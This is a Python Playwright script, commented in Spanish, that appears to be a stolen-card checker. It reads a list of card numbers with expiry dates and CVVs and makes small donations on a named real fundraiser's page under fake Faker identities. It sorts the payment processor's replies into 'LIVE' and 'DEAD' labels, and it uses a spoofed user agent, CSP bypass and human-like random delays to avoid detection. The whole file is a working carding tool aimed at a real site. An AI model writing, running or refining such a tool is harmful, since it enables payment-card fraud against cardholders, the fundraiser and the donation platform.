import time
import random
from playwright.sync_api import sync_playwright
from faker import Faker

def navegador_limpio(url):
    fake = Faker('en_US')
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=[
            '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas', '--no-first-run', '--no-zygote', '--disable-gpu',
        ])
        
        context = browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            locale='es-ES', timezone_id='Europe/Madrid', permissions=[], java_script_enabled=True,
            bypass_csp=True, accept_downloads=True,
        )
        page = context.new_page()

        print(f"Navegando a: {url}")
        page.goto(url, wait_until='networkidle')
        page.wait_for_load_state('domcontentloaded')
        print(f"✅ Página cargada: {page.title()}")

        try:
            # --- PEDIR LA LISTA DE TARJETAS AL INICIO ---
            print("\n" + "="*50)
            print("Por favor, introduce la lista de tarjetas a verificar (una por línea):")
            print("Ejemplo:\n4169160621990291|12|2030|123\n4169160621991950|12|2030|123")
            print("="*50)
            
            input_lines = []
            while True:
                line = input()
                if not line:
                    break
                input_lines.append(line.strip())

            card_list = [line for line in input_lines if line]
            if not card_list:
                print("❌ No se introdujeron tarjetas. Saliendo.")
                return

            print(f"\nSe han cargado {len(card_list)} tarjetas para verificar. Iniciando el proceso...\n")
            
            # Diccionario de respuestas
            response_map = {
                "your card's security code is incorrect.": "❌ LIVE CVV INCORRECTO",
                "your card's cvc is invalid.": "LIVE CVV INCORRECTO",
                "your card's security code is invalid.": "✅ LIVE CVV INCORRECTO",
                "your card number is incorrect.": "LIVE CC INCORRECTO",
                "your card number is invalid.": "LIVE CC INCORRECTO",
                "your card has expired.": "❌ DEAD - TARJETA EXPIRADA",
                "your card is not supported.": "DEAD - TARJETA NO SOPORTADA",
                "your card was declined.": "❌ DEAD - TARJETA RECHAZADA",
                "your card has been declined.": "DEAD - TARJETA RECHAZADA",
                "insufficient funds.": "💸 LIVE - FONDOS INSUFICIENTES",
                "the donation has been processed successfully.": "✅ Aprobada - Donación Exitosa",
            }
            
            # Lista para guardar los resultados
            results = []

            # --- BUCLE PARA PROCESAR CADA TARJETA ---
            for i, card_data_str in enumerate(card_list):
                print(f"\n{'='*20} PROCESANDO TARJETA {i+1}/{len(card_list)} {'='*20}")
                print(f"Datos: {card_data_str}")
                
                try:
                    # --- PASO 1: RECARGAR PÁGINA ANTES DE CADA TARJETA ---
                    if i > 0:
                        print("Recargando la página para la siguiente tarjeta...")
                        page.reload(wait_until='networkidle')
                        time.sleep(random.uniform(3, 5))

                    # --- PASO 2: EJECUTAR EL SCRIPT COMPLETO PARA UNA TARJETA ---
                    # Dividir los datos de la tarjeta actual
                    try:
                        card_number, expiry_month, expiry_year, cvc = card_data_str.split('|')
                        expiry_date = f"{expiry_month}/{expiry_year[-2:]}"
                    except ValueError:
                        print(f"❌ Formato de tarjeta incorrecto, saltando... Datos: {card_data_str}")
                        results.append({'card': card_data_str, 'status': 'FORMATO INCORRECTO'})
                        continue

                    # Parte 1: Cantidad
                    print("PARTE 1: Introduciendo cantidad...")
                    page.fill('#onetimeCustomDonationAmountInput', "5")
                    time.sleep(random.uniform(0.8, 1.5))
                    page.click('#donateButtonBeforePayment')

                    # Parte 2: Datos personales
                    print("PARTE 2: Rellenando datos personales...")
                    time.sleep(random.uniform(2.0, 4.0))
                    nombre, apellido = fake.first_name(), fake.last_name()
                    correo = f"{nombre.lower()}{apellido.lower()}{fake.random_int(min=1, max=99)}@example.com"
                    page.fill('#donationFirstName', nombre)
                    time.sleep(random.uniform(0.3, 0.8))
                    page.fill('#donationLastName', apellido)
                    time.sleep(random.uniform(0.3, 0.8))
                    page.fill('#donationEmail', correo)
                    time.sleep(random.uniform(0.8, 1.5))
                    page.click('#donationSave')

                    # Parte 3: Datos de tarjeta
                    print("PARTE 3: Rellenando datos de tarjeta...")
                    time.sleep(random.uniform(3.0, 5.0))
                    page.click('body', timeout=5000)
                    time.sleep(random.uniform(1.0, 2.0))
                    
                    payment_form_container_selector = '#payment-element'
                    page.wait_for_selector(payment_form_container_selector, state='visible', timeout=10000)
                    card_frame_locator = page.locator(payment_form_container_selector).frame_locator('iframe')

                    card_frame_locator.locator('#payment-numberInput').fill(card_number)
                    time.sleep(random.uniform(0.5, 1.0))
                    card_frame_locator.locator('#payment-expiryInput').fill(expiry_date)
                    time.sleep(random.uniform(0.5, 1.0))
                    card_frame_locator.locator('#payment-cvcInput').fill(cvc)
                    time.sleep(random.uniform(0.8, 1.5))

                    # Parte 4: Enviar pago y analizar respuesta
                    print("PARTE 4: Enviando pago y analizando respuesta...")
                    opcion_con_comision_selector = 'span:has-text("£ 5.7")'
                    page.wait_for_selector(opcion_con_comision_selector, timeout=10000)
                    page.click(opcion_con_comision_selector)

                    # Lógica de análisis de respuesta
                    message_selector = '#payment-message'
                    result_status = "DESCONOCIDO"
                    try:
                        page.wait_for_selector(message_selector, state='visible', timeout=20000)
                        message_text = page.inner_text(message_selector).strip()
                        
                        # --- NUEVA LÍNEA AÑADIDA: Imprimir la respuesta exacta ---
                        print(f"RESPUESTA EXACTA DEL SERVIDOR: '{message_text}'")
                        
                        normalized_message = message_text.lower().replace("’", "'").replace("‘", "'")
                        
                        for key_phrase, status in response_map.items():
                            if key_phrase in normalized_message:
                                result_status = status
                                break
                    except Exception:
                        result_status = "DEAD POSIBLE 3D"

                    print(f"*** RESULTADO PARA ESTA TARJETA: {result_status} ***")
                    results.append({'card': card_data_str, 'status': result_status})
                    time.sleep(3) # Pausa antes de recargar

                except Exception as e:
                    print(f"\n❌ Ocurrió un error procesando la tarjeta {card_data_str}. Error: {e}")
                    results.append({'card': card_data_str, 'status': f'ERROR: {e}'})
                    # En caso de error, también recargamos para intentar con la siguiente
                    page.reload(wait_until='networkidle')
                    time.sleep(random.uniform(3, 5))
            
            # --- IMPRIMIR RESUMEN FINAL ---
            print("\n" + "="*20 + " RESUMEN FINAL DE TODAS LAS TARJETAS " + "="*20)
            for res in results:
                print(f"Tarjeta: {res['card']:<30} | Estado: {res['status']}")
            print("="*75)

        except Exception as e:
            print(f"\n❌ Ocurrió un error crítico en el bucle principal: {e}")
        
        input("\nProceso finalizado. Presiona ENTER para cerrar el navegador...")
        context.close()
        browser.close()

# Las funciones human_type y human_type_frame no son estrictamente necesarias para esta versión
# pero las mantenemos por si se desean añadir pausas más tarde.
def human_type(page, text):
    for char in text:
        page.keyboard.type(char)
        time.sleep(random.uniform(0.05, 0.15))

def human_type_frame(frame_locator, selector, text):
    for char in text:
        frame_locator.locator(selector).type(char)
        time.sleep(random.uniform(0.05, 0.15))

if __name__ == "__main__":
    url = "https://whydonate.com/donate/help-stathis-recover-from-fnd"
    navegador_limpio(url)